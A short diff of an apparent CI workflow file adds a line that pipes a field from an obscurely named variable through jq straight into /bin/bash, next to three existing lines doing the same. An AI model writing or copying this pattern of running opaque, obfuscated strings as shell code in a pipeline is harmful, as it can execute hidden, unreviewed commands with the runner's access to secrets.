@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$bdid0711" | jq -r .qi1280 | /bin/bash
           echo $hh54 | jq -r .ha3102 | /bin/bash
           echo $lof64 | jq -r .p95 | /bin/bash
+          printf '%s' "$v4468" | jq -r .qn200 | /bin/bash
 
       - name: Upload data
         if: always()
